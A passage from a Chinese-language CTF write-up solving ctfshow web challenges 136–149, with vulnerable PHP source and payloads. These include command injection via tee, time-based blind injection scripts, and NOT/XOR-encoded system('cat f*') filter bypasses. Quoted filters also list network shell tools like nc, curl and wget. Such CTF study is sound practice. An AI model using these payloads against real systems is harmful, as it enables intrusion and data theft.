class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>check函数</code>对一些特殊符号以及指令进行了过滤，如果含有就会触发die函数。而该代码的步骤就是先通过check函数对<code>c</code>进行检查，然后通过<code>exec</code>进行命令执行。                                                                                                                        未被过滤的符号</p><pre class="line-numbers language-none"><code class="language-none">&quot;&#39;()+,-&#x2F;:;&#x3D;ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]_&#96;abcdefghijklmnopqrstuvwxyz|~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于其将<code>*</code>和<code>?</code>都过滤了，导致我们就算构造<code>cat f*</code>也没法用，且其结果无回显，<code>&gt;</code>被过滤导致我们无法写入其他文件，而<code>mv</code>和<code>cp</code>被过滤也导致了其他文件更没法写入。这里要用到Linux中的一个命令<code>tee</code></p><pre class="line-numbers language-none"><code class="language-none">Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意，在该题中<code>|</code>，管道符是没被禁止的，所以当我们在管道符前面<code>ls /</code>所扫出的信息，通过<code>|</code>隔着<code>tee 1</code>可以将<code>ls /</code>的信息写入<code>1</code>文件中。从而让我们了解到此时根目录有哪些文件。然后如果有flag文件，则通过<code>cat</code>命令拿到flag。                                                                                                                                                                                    此时根目录下文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401251725516.png"></p><p>flag的值</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401251726377.png"></p><pre class="line-numbers language-none"><code class="language-none">即最终构造GET:  c&#x3D;ls &#x2F;|tee 1GET:  c&#x3D;cat &#x2F;f149_15_h3r3|tee 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123;  function __wakeup()&#123;    die(&quot;private class&quot;);  &#125;  static function getFlag()&#123;    echo file_get_contents(&quot;flag.php&quot;);  &#125;&#125;call_user_func($_POST[&#39;ctfshow&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过最后的POST传参，我们可以考虑到，本题是与<code>call_user_func</code>该函数有关。在前面我们学到过，</p><pre class="line-numbers language-none"><code class="language-none">call_user_func()  调用回调函数，并把一个数组参数作为回调函数的参数但同时call_user_func还有很多用法，具体可看https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;function.call-user-func.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401262105467.png"></p><p>至此，我们可以构造类似的参，以此获得flag.php中的内容</p><pre class="line-numbers language-none"><code class="language-none">POST:  ctfshow&#x3D;ctfshow::getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从而拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401262055611.png"></p><h3 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123;  function __wakeup()&#123;    die(&quot;private class&quot;);  &#125;  static function getFlag()&#123;    echo file_get_contents(&quot;flag.php&quot;);  &#125;&#125;if(strripos($_POST[&#39;ctfshow&#39;], &quot;:&quot;)&gt;-1)&#123;  die(&quot;private function&quot;);&#125;call_user_func($_POST[&#39;ctfshow&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相较于上题对<code>POST传的参ctfshow</code>进行了一次查询，即查询在传入的参<code>ctfshow</code>中，如果出现了<code>:</code>就会触发die函数。</p><pre class="line-numbers language-none"><code class="language-none">strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里利用到的是<code>call_user_func函数</code>里面可以传数组，当第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用该方法从而执行方法内的代码。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401272039782.png"></p><p>其内涵就像</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; 用户传入的参数，类似于 $_POST[&#39;ctfshow&#39;]$user_input &#x3D; [    &#39;ctfshow&#39;, &#x2F;&#x2F; 类名    &#39;getFlag&#39; &#x2F;&#x2F; 方法名];call_user_func([$user_input[0], $user_input[1]]); &#x2F;&#x2F;就等同于如果用户传入的参数是一个字符串，直接调用该函数；而如果是一个数组，则将数组的第一个元素作为类名，第二个元素作为方法名，然后调用该方法。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以构造下面从而拿到flag</p><pre class="line-numbers language-none"><code class="language-none">ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401262129609.png"></p><h3 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h3><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phperror_reporting(0);function check($x)&#123;  if(preg_match(&#39;&#x2F;\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&#39;, $x))&#123;    die(&#39;too young too simple sometimes naive!&#39;);  &#125;&#125;if(isset($_GET[&#39;c&#39;]))&#123;  $c&#x3D;$_GET[&#39;c&#39;];  check($c);  exec($c);&#125;else&#123;  highlight_file(__FILE__);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与<code>web136</code>相比，确实看着像没什么变化，但是按照<code>web136</code>的指令是没法实现的，这里按照官方WP给的脚本复现了一遍。里面涉及到了<code>awk命令</code> ，其是一种处理文本文件的语言，是一个强大的文本分析工具<a href="https://www.runoob.com/linux/linux-comm-awk.html">Linux awk 命令 | 菜鸟教程 (runoob.com)</a></p><p>第一个脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requestsimport timeimport stringstr&#x3D;string.ascii_letters+string.digits #生成所有字母与数字[a-zA-Z0-9]result&#x3D;&quot;&quot;for i in range(1,5):  &#x2F;&#x2F; # 假设最多有5个目录   key&#x3D;0   for j in range(1,15):  # 假设目录名最多有15个字符      if key&#x3D;&#x3D;1:         break      for n in str:         payload&#x3D;&quot;if [ &#96;ls &#x2F;|awk &#39;NR&#x3D;&#x3D;&#123;0&#125;&#39;|cut -c &#123;1&#125;&#96; &#x3D;&#x3D; &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)         #print(payload)         url&#x3D;&quot;http:&#x2F;&#x2F;e5404d73-a384-4498-abe4-fc589c355caf.challenge.ctf.show&#x2F;?c&#x3D;&quot;+payload         try:            requests.get(url,timeout&#x3D;(2.5,2.5))         except:             result&#x3D;result+n             print(result)             break         if n&#x3D;&#x3D;&#39;9&#39;:            key&#x3D;1   result+&#x3D;&quot; &quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该脚本通过访问根目录，然后通过<code>awk命令</code>、<code>cut命令</code>截取字符，再进行<code>sleep命令</code>确认是否正确，从而对根目录的文件进行一个字符一个字符的爬取，例如当payload为<code>if [ls /|awk &#39;NR==&#123;0&#125;&#39;|cut -c &#123;1&#125; == &#123;2&#125; ];then sleep 3;fi</code></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401281651907.png"></p><p>第二个脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requestsimport timeimport stringstr&#x3D;string.digits+string.ascii_lowercase+&quot;-&quot;#获取小写字母与数字result&#x3D;&quot;&quot;key&#x3D;0for j in range(1,45):   print(j)   if key&#x3D;&#x3D;1:      break   for n in str:      payload&#x3D;&quot;if [ &#96;cat &#x2F;f149_15_h3r3|cut -c &#123;0&#125;&#96; &#x3D;&#x3D; &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)      #print(payload)      url&#x3D;&quot;http:&#x2F;&#x2F;e5404d73-a384-4498-abe4-fc589c355caf.challenge.ctf.show&#x2F;?c&#x3D;&quot;+payload      try:         requests.get(url,timeout&#x3D;(2.5,2.5))    #time()第一个参数是响应时间，第二个是读取时间      except:          result&#x3D;result+n          print(result)          break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再进行第二个脚本可以拿到flag，记得加上{}</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401281702007.png"></p><h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#39;f1&#39;]) &amp;&amp; isset($_POST[&#39;f2&#39;]))&#123;  $f1 &#x3D; (String)$_POST[&#39;f1&#39;];  $f2 &#x3D; (String)$_POST[&#39;f2&#39;];  if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f1))&#123;    if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f2))&#123;      $code &#x3D; eval(&quot;return $f1($f2());&quot;);      if(intval($code) &#x3D;&#x3D; &#39;ctfshow&#39;)&#123;        echo file_get_contents(&quot;flag.php&quot;);      &#125;    &#125;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先我们需要<code>POST</code>传参<code>f1</code>、<code>f2</code>，然后对其进行字符强转换。看到<code>$code</code>中的<code>$f1($f2());</code>感觉有点熟悉，不过前面用的是<code>反射类</code>，但是在这里对<code>f1</code>、<code>f2</code>进行了以此<code>preg_match</code>过滤，规定其只能<code>含有小写字母和数字</code>。所以我们需要另辟蹊径了。在这里面需要用到的是松散比较<a href="https://www.php.net/manual/zh/types.comparisons.php">PHP: PHP 类型比较表 - Manual</a>。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401282032552.png"></p><p>当<code>0==字符串</code>时返回的为true，而<code>intval($var,$base)函数</code>有一个特性就是<code>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</code>所以当我们使其return为一个<code>非数字字符</code>，其会将其转换为0，而在松散比较中<code>0==字符串</code>为<code>TRUE</code>，那么这个<code>if</code>就可以正常执行，即我们可以使其<code>echo</code>出<code>flag.php</code>中的内容，从而拿到flag  所以我们可以构造</p><pre class="line-numbers language-none"><code class="language-none">POST: f1&#x3D;md5&amp;f2&#x3D;md5POST: f1&#x3D;sleep&amp;f2&#x3D;sleepPOST: f1&#x3D;sha1&amp;f2&#x3D;sha1POST: f1&#x3D;eval&amp;f2&#x3D;sleep即只要我们满足该函数仅有小写字母和数字即可(说的太满了T T)。比如俩个eval就不行了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401282021436.png"></p><h3 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php\#error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;  $v1 &#x3D; (String)$_GET[&#39;v1&#39;];  $v2 &#x3D; (String)$_GET[&#39;v2&#39;];  $v3 &#x3D; (String)$_GET[&#39;v3&#39;];  if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;    if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;, $v3))&#123;      $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;);      echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;    &#125;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在该源码中，<code>$v1</code>和<code>$v2</code>对其进行了<code>is_numeric函数</code>判断，使其只有数字。而对<code>$v3</code>的<code>preg_match函数</code>过滤，<code>/^\W+$/</code> 作用是匹配非数字字母下划线的字符。且<code>$v1</code>、<code>$v2</code>、<code>$v3</code>都进行了一些字符串强类型转换。</p><p>在php中，当使用<code>return</code>返回值时，数字可以和命令进行一些运算，比如<code>1-sleep();</code>，其是会被判定执行sleep命令的。（除了减号，还有加、乘、除号，但由于正常使用<code>+</code>号会导致其被转换为空格，所以如果使用<code>+</code>，需要对其进行<code>URL编码</code>。）</p><p>所以我们可以构造</p><pre class="line-numbers language-none"><code class="language-none">GET： v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;-(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5);-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里面<code>(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5);</code>的实际意思为<code>system(cat f*);</code></p><p> <strong>system的取反echo urlencode(~’system’);  <strong>取反结果为</strong>%8C%86%8C%8B%9A%92</strong></p><p><strong>cat f*的取反echo urlencode(~’cat f*‘); 取反结果为%9C%9E%8B%DF%99%D5</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401282049919.png"></p><h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]))&#123;  $v1 &#x3D; (String)$_GET[&#39;v1&#39;];  if(is_numeric($v1))&#123;    $d &#x3D; (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);    sleep($d);    echo file_get_contents(&quot;flag.php&quot;);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题我的大概理解就是<code>get</code>传入的<code>v1</code>，然后对其进行了<code>string</code>(字符)类型转换，再通过<code>is_numeric()</code>对<code>v1</code>进行判断其是否为数字，如果其是数字，则让其与<code>5</code>个<code>0x36d</code>进行相乘，即与<code>5个877</code>(十进制)进行相乘，并对其进行强类型转换，所以这里我们可以用到的就是<code>八进制</code>与<code>十六进制</code>了，由于其下面有一个<code>sleep函数</code>，如果我们为<code>v1</code>哪怕赋个转换值为1，也要睡眠半天，所以我们需要给<code>v1</code>传参使其<code>八进制或十六进制</code>转换后为<code>0</code>。</p><pre class="line-numbers language-none"><code class="language-none">即GET: v1&#x3D;0GET: v1&#x3D;0x0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402282046730.png"></p><p>打开源代码即可拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402282047117.png"></p><h3 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;  $v1 &#x3D; (String)$_GET[&#39;v1&#39;];  $v2 &#x3D; (String)$_GET[&#39;v2&#39;];  $v3 &#x3D; (String)$_GET[&#39;v3&#39;];  if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;    if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;&#x2F;i&#39;, $v3))&#123;        die(&#39;get out hacker!&#39;);    &#125;    else&#123;      $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;);      echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;    &#125;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目描述为web141的plus版，与141相比，本题过滤了更多，仅当<code>v3</code>输出这些字母时不会触发die函数</p><pre class="line-numbers language-none"><code class="language-none">!&quot;#&#39;()*,&#x2F;:&lt;&#x3D;&gt;?@[\]^&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本题没有禁^，所以我们可以通过异或的方式来绕过</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403061407038.png"></p><p>可以发现其key为<code>80</code>的时候，异或为正常的linux语句，所以由于其有5个，所以要乘于5个<code>%80</code>以确保都被异或成功，前者同理。</p><pre class="line-numbers language-none"><code class="language-none">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;*(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与web141一样，数字与函数进行运算也是可以执行函数的，所以在本题中无论是用<code>*</code>还是<code>^</code>，最终都能从源码中找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202402282102097.png"></p><h3 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;  $v1 &#x3D; (String)$_GET[&#39;v1&#39;];  $v2 &#x3D; (String)$_GET[&#39;v2&#39;];  $v3 &#x3D; (String)$_GET[&#39;v3&#39;];  if(is_numeric($v1) &amp;&amp; check($v3))&#123;    if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;, $v2))&#123;      $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;);      echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;    &#125;  &#125;&#125;function check($str)&#123;  return strlen($str)&#x3D;&#x3D;&#x3D;1?true:false;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>描述上说是<code>web143的plus</code>版本，相较于<code>web143</code>增添了一个<code>check</code>函数，用来判断传入的<code>$v3</code>，运用了一个三目运算符</p><pre class="line-numbers language-none"><code class="language-none">if strlen($v3) &#x3D;&#x3D;&#x3D; 1:return trueelse:return false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>即判断传入的v3的字符长度必须是<code>1,</code>,这里可以构造</p><pre class="line-numbers language-none"><code class="language-none">v1&#x3D;1&amp;v3&#x3D;2&amp;v2&#x3D;*(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从而拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403061420727.png"></p><h3 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;  $v1 &#x3D; (String)$_GET[&#39;v1&#39;];  $v2 &#x3D; (String)$_GET[&#39;v2&#39;];  $v3 &#x3D; (String)$_GET[&#39;v3&#39;];  if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;    if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\&#x2F;|\^|\#|\&quot;&#x2F;i&#39;, $v3))&#123;        die(&#39;get out hacker!&#39;);    &#125;    else&#123;      $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;);      echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;    &#125;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此题描述为<code>web144的plus版本</code>，通过fuzz脚本，我们可以看到此题我们还能用到哪些字符</p><pre class="line-numbers language-none"><code class="language-none">&#39;(),:&#x3D;?[\]&#96;&#123;|~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时<code>~</code>还没有被过滤，本题的考点在于对三目运算符的巧用。可以构造payload</p><pre class="line-numbers language-none"><code class="language-none">v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5):<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403061928182.png"></p><p>或者可以利用<code>|()|</code>的方式来构造payload</p><pre class="line-numbers language-none"><code class="language-none">v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)|<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403061930939.png"></p><h3 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;  $v1 &#x3D; (String)$_GET[&#39;v1&#39;];  $v2 &#x3D; (String)$_GET[&#39;v2&#39;];  $v3 &#x3D; (String)$_GET[&#39;v3&#39;];  if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;    if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\&#x2F;|\^|\#|\&quot;&#x2F;i&#39;, $v3))&#123;        die(&#39;get out hacker!&#39;);    &#125;    else&#123;      $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;);      echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;    &#125;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>套娃了，这题的描述是<code>web145的plus版本</code>，可用的字符为</p><pre class="line-numbers language-none"><code class="language-none">&#39;(),&#x3D;?[\]&#96;&#123;|~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分号被过滤了，这题用不了三目运算符，不过发现上题第二种方法还是能够拿到flag</p><pre class="line-numbers language-none"><code class="language-none">v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)|<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403061936724.png"></p><p>看佬博客还有一种构造方法，是利用等号和位运算符</p><pre class="line-numbers language-none"><code class="language-none">v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;&#x3D;&#x3D;(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(isset($_POST[&#39;ctf&#39;]))&#123;  $ctfshow &#x3D; $_POST[&#39;ctf&#39;];  if(!preg_match(&#39;&#x2F;^[a-z0-9_]*$&#x2F;isD&#39;,$ctfshow)) &#123;    $ctfshow(&#39;&#39;,$_GET[&#39;show&#39;]);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过fuzz脚本，我们可以看到<code>$ctfshow</code>只能用如下的字符</p><pre class="line-numbers language-none"><code class="language-none">!&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^&#96;&#123;|&#125;~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本题不会，看网上佬写的wp，本题的考点是<a href="https://my.oschina.net/huyex/blog/2885273">create_function函数注入</a>,利用create_function进行代码注入，需要用到<code>&#125;</code>闭合原来的函数，然后再执行新的命令，并且通过注释来将多余的<code>&#125;</code>，在php中，默认存放的位置在<code>\</code>。所有原生的类和方法都在这个命令空间。所以我们可以通过为<code>ctf</code>传参来调用<code>create_function</code>函数，然后再通过<code>GET</code>传参<code>show</code>进行执行命令。</p><pre class="line-numbers language-none"><code class="language-none">GET: ?show&#x3D;&#125;system(&quot;cat f*&quot;);&#x2F;&#x2F;POST: ctf&#x3D;\create_function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>成功拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403062010405.png"></p><h3 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;]))&#123;  $code&#x3D;$_GET[&#39;code&#39;];  if(preg_match(&quot;&#x2F;[A-Za-z0-9_\%\\|\~\&#39;\,\.\:\@\&amp;\*\+\- ]+&#x2F;&quot;,$code))&#123;    die(&quot;error&quot;);  &#125;  @eval($code);&#125;else&#123;  highlight_file(__FILE__);&#125;function get_ctfshow_fl0g()&#123;  echo file_get_contents(&quot;flag.php&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有当我们输入以下字符时不会触发<code>die函数</code></p><pre class="line-numbers language-none"><code class="language-none">!&quot;#$()&#x2F;;&lt;&#x3D;&gt;?[\]^&#96;&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以发现我们可以进行异或来实现代码，所以我们可以构造</p><pre class="line-numbers language-none"><code class="language-none">code&#x3D;(&quot;%80%80%80%80%80%80&quot;^&quot;%F3%F9%F3%F4%E5%ED&quot;)(&quot;%80%80%80%80%80&quot;^&quot;%E3%E1%F4%A0%AA&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403062020119.png"></p><h3 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);$files &#x3D; scandir(&#39;.&#x2F;&#39;); foreach($files as $file) &#123;  if(is_file($file))&#123;    if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;      unlink($file);    &#125;  &#125;&#125;file_put_contents($_GET[&#39;ctf&#39;], $_POST[&#39;show&#39;]);$files &#x3D; scandir(&#39;.&#x2F;&#39;); foreach($files as $file) &#123;  if(is_file($file))&#123;    if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;      unlink($file);    &#125;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题描述**”你写的快还是我删的快”**运用到一个<code>unlink函数</code></p><pre class="line-numbers language-none"><code class="language-none">unlink(PHP 4, PHP 5, PHP 7)unlink — 删除文件说明unlink ( string &#96;$filename&#96; [, resource &#96;$context&#96; ] ) : bool删除 &#96;filename&#96;。和 Unix C 的 unlink() 函数相似。 发生错误时会产生一个 &#96;E_WARNING&#96; 级别的错误。参数- &#96;filename&#96;  文件的路径。- &#96;context&#96;  Note: 在 PHP 